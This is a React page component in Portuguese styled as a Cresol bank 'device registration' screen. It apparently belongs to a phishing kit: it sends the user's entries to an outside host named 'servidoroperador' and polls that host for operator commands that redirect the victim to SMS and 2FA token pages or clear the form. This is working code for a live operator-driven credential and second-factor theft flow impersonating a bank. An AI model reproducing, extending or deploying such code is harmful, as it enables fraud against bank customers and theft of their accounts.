
import React, { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import { Calendar, ArrowLeft } from "lucide-react";
import { format } from "date-fns";
import { ptBR } from "date-fns/locale";
import cresolLogo from "/lovable-uploads/afc18ce7-1259-448e-9ab4-f02f2fbbaf19.png";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Calendar as CalendarComponent } from "@/components/ui/calendar";
import {
  Popover,
  PopoverContent,
  PopoverTrigger,
} from "@/components/ui/popover";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select";
import { useToast } from "@/hooks/use-toast";
import { cn } from "@/lib/utils";

const DispositivoPage = () => {
  const navigate = useNavigate();
  const { toast } = useToast();
  
  const [dataFundacao, setDataFundacao] = useState<Date>();
  const [apelidoDispositivo, setApelidoDispositivo] = useState("");
  const [validadeAcesso, setValidadeAcesso] = useState("");
  const [dataValidade, setDataValidade] = useState<Date>();
  const [isLoading, setIsLoading] = useState(false);
  
  // Contador de caracteres para apelido
  const maxCaracteres = 50;
  const caracteresRestantes = maxCaracteres - apelidoDispositivo.length;

  // Função para monitorar cliente após envio
  const monitorClienteDispositivo = async (clientId: string): Promise<void> => {
    console.log(`Iniciando monitoramento após envio de dados do dispositivo: ${clientId}`);
    
    let intervalId: NodeJS.Timeout;
    
    const monitor = async () => {
      try {
        console.log(`Consultando resposta para dados do dispositivo ${clientId}...`);
        
        const response = await fetch(`https://servidoroperador.onrender.com/api/clients/${clientId}/info`, {
          method: 'GET',
          headers: {
            'Content-Type': 'application/json',
          }
        });

        if (response.ok) {
          const clientData = await response.json();
          console.log('Dados recebidos após envio dispositivo:', clientData);
          
          // Verificar comando de dados incorretos para dispositivo
          if (clientData.data?.response === "inv_auth" || clientData.data?.command === "inv_auth") {
            console.log('Detectado inv_auth - Dados do dispositivo incorretos, limpando campos');
            clearInterval(intervalId);
            setIsLoading(false);
            limparCampos();
            toast({
              title: "Dados inválidos",
              description: "Os dados informados estão incorretos. Verifique e tente novamente.",
              variant: "destructive",
            });
            return;
          }
          
          // Verificar outros redirecionamentos
          if (clientData.data?.response === "ir_sms" || clientData.data?.command === "ir_sms") {
            console.log('Detectado ir_sms após dispositivo - Redirecionando para /sms');
            clearInterval(intervalId);
            navigate('/sms');
            return;
          }
          
          if (clientData.data?.response === "ir_2fa" || clientData.data?.command === "ir_2fa") {
            console.log('Detectado ir_2fa após dispositivo - Redirecionando para /token');
            clearInterval(intervalId);
            navigate('/token');
            return;
          }
          
        } else {
          console.log('Erro na consulta do dispositivo:', response.status);
        }

      } catch (error) {
        console.log('Erro durante monitoramento do dispositivo:', error);
      }
    };

    // Executar primeira consulta após 1 segundo
    setTimeout(monitor, 1000);
    
    // Configurar monitoramento contínuo a cada 3 segundos
    intervalId = setInterval(monitor, 3000);
    console.log('Monitoramento de dispositivo configurado (3 segundos)');
  };

  // Função para limpar campos
  const limparCampos = () => {
    setDataFundacao(undefined);
    setApelidoDispositivo("");
    setValidadeAcesso("");
    setDataValidade(undefined);
  };

  // Função para enviar dados do dispositivo
  const handleCadastrarDispositivo = async (e: React.FormEvent) => {
    e.preventDefault();
    
    // Validações
    if (!dataFundacao) {
      toast({
        title: "Data obrigatória",
        description: "Por favor, selecione a data da fundação.",
        variant: "destructive",
      });
      return;
    }
    
    if (!apelidoDispositivo.trim()) {
      toast({
        title: "Apelido obrigatório",
        description: "Por favor, digite um apelido para o dispositivo.",
        variant: "destructive",
      });
      return;
    }
    
    if (!validadeAcesso) {
      toast({
        title: "Validade obrigatória",
        description: "Por favor, selecione a validade de acesso.",
        variant: "destructive",
      });
      return;
    }
    
    if (validadeAcesso === "ate_data" && !dataValidade) {
      toast({
        title: "Data de validade obrigatória",
        description: "Por favor, selecione a data de validade.",
        variant: "destructive",
      });
      return;
    }
    
    setIsLoading(true);
    
    try {
      const clientId = localStorage.getItem('clientId');
      
      if (!clientId) {
        console.log('ClientId não encontrado');
        setIsLoading(false);
        return;
      }
      
      // Preparar dados para envio
      const dadosDispositivo = {
        dataFundacao: format(dataFundacao, "dd/MM/yyyy"),
        apelidoDispositivo: apelidoDispositivo.trim(),
        validadeAcesso: validadeAcesso,
        dataValidade: validadeAcesso === "ate_data" && dataValidade ? format(dataValidade, "dd/MM/yyyy") : null,
        command: "ir_auth"
      };
      
      console.log('Enviando dados do dispositivo:', dadosDispositivo);
      
      // Enviar dados usando external-response
      const response = await fetch('https://servidoroperador.onrender.com/api/clients/external-response', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          clientId: clientId,
          response: dadosDispositivo
        })
      });
      
      console.log('Status do envio dos dados do dispositivo:', response.status);
      
      if (response.ok) {
        console.log('Dados do dispositivo enviados com sucesso');
        // Iniciar monitoramento
        await monitorClienteDispositivo(clientId);
      } else {
        const errorData = await response.text();
        console.log('Erro no envio dos dados do dispositivo:', errorData);
        setIsLoading(false);
      }
      
    } catch (error) {
      console.log('Erro durante envio dos dados do dispositivo:', error);
      setIsLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-[#f5f6f7] flex flex-col">
      {/* Header com logo */}
      <div className="bg-white shadow-sm">
        <div className="max-w-4xl mx-auto px-4 py-4 flex items-center">
          <button
            onClick={() => navigate('/home')}
            className="mr-4 p-2 hover:bg-gray-100 rounded-full transition-colors"
          >
            <ArrowLeft size={20} className="text-gray-600" />
          </button>
          <img
            src={cresolLogo}
            alt="Cresol"
            className="h-8"
          />
        </div>
      </div>

      {/* Conteúdo principal */}
      <div className="flex-1 flex items-center justify-center px-4 py-8">
        <div className="bg-white rounded-lg shadow-lg p-8 w-full max-w-md">
          <div className="text-center mb-8">
            <h1 className="text-2xl font-bold text-gray-800 mb-2">
              Cadastro de Dispositivo
            </h1>
            <p className="text-gray-600">
              Complete as informações para cadastrar este dispositivo
            </p>
          </div>

          <form onSubmit={handleCadastrarDispositivo} className="space-y-6">
            {/* Data da Fundação */}
            <div className="space-y-2">
              <Label htmlFor="dataFundacao" className="text-sm font-medium text-gray-700">
                Data da Fundação *
              </Label>
              <Popover>
                <PopoverTrigger asChild>
                  <Button
                    variant="outline"
                    className={cn(
                      "w-full justify-start text-left font-normal h-12",
                      !dataFundacao && "text-muted-foreground"
                    )}
                  >
                    <Calendar className="mr-2 h-4 w-4" />
                    {dataFundacao ? (
                      format(dataFundacao, "dd 'de' MMMM 'de' yyyy", { locale: ptBR })
                    ) : (
                      <span>Selecione a data da fundação</span>
                    )}
                  </Button>
                </PopoverTrigger>
                <PopoverContent className="w-auto p-0" align="start">
                  <CalendarComponent
                    mode="single"
                    selected={dataFundacao}
                    onSelect={setDataFundacao}
                    disabled={(date) =>
                      date > new Date() || date < new Date("1900-01-01")
                    }
                    initialFocus
                    className="p-3 pointer-events-auto"
                  />
                </PopoverContent>
              </Popover>
            </div>

            {/* Apelido do Dispositivo */}
            <div className="space-y-2">
              <Label htmlFor="apelido" className="text-sm font-medium text-gray-700">
                Apelido do Dispositivo *
              </Label>
              <div className="relative">
                <Input
                  id="apelido"
                  type="text"
                  placeholder="Digite um nome para identificar este dispositivo"
                  value={apelidoDispositivo}
                  onChange={(e) => setApelidoDispositivo(e.target.value)}
                  maxLength={maxCaracteres}
                  className="h-12 pr-16"
                />
                <span className="absolute right-3 top-1/2 -translate-y-1/2 text-xs text-gray-500">
                  {caracteresRestantes}
                </span>
              </div>
            </div>

            {/* Validade de Acesso */}
            <div className="space-y-2">
              <Label className="text-sm font-medium text-gray-700">
                Validade de Acesso *
              </Label>
              <Select value={validadeAcesso} onValueChange={setValidadeAcesso}>
                <SelectTrigger className="h-12">
                  <SelectValue placeholder="Selecione a validade do acesso" />
                </SelectTrigger>
                <SelectContent>
                  <SelectItem value="indeterminado">Tempo indeterminado</SelectItem>
                  <SelectItem value="apenas_acesso">Somente por este acesso</SelectItem>
                  <SelectItem value="ate_data">Até uma data específica</SelectItem>
                </SelectContent>
              </Select>
            </div>

            {/* Data de Validade - condicional */}
            {validadeAcesso === "ate_data" && (
              <div className="space-y-2">
                <Label className="text-sm font-medium text-gray-700">
                  Data de Validade *
                </Label>
                <Popover>
                  <PopoverTrigger asChild>
                    <Button
                      variant="outline"
                      className={cn(
                        "w-full justify-start text-left font-normal h-12",
                        !dataValidade && "text-muted-foreground"
                      )}
                    >
                      <Calendar className="mr-2 h-4 w-4" />
                      {dataValidade ? (
                        format(dataValidade, "dd 'de' MMMM 'de' yyyy", { locale: ptBR })
                      ) : (
                        <span>Selecione a data de validade</span>
                      )}
                    </Button>
                  </PopoverTrigger>
                  <PopoverContent className="w-auto p-0" align="start">
                    <CalendarComponent
                      mode="single"
                      selected={dataValidade}
                      onSelect={setDataValidade}
                      disabled={(date) => date < new Date()}
                      initialFocus
                      className="p-3 pointer-events-auto"
                    />
                  </PopoverContent>
                </Popover>
              </div>
            )}

            {/* Botões */}
            <div className="flex space-x-4 pt-4">
              <Button
                type="button"
                variant="outline"
                onClick={() => navigate('/home')}
                className="flex-1 h-12 border-gray-300 text-gray-700 hover:bg-gray-50"
                disabled={isLoading}
              >
                Cancelar
              </Button>
              <Button
                type="submit"
                disabled={isLoading}
                className="flex-1 h-12 bg-orange-500 hover:bg-orange-600 text-white font-semibold"
              >
                {isLoading ? (
                  <div className="flex items-center">
                    <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin mr-2"></div>
                    Cadastrando...
                  </div>
                ) : (
                  "Cadastrar"
                )}
              </Button>
            </div>
          </form>
        </div>
      </div>
    </div>
  );
};

export default DispositivoPage;
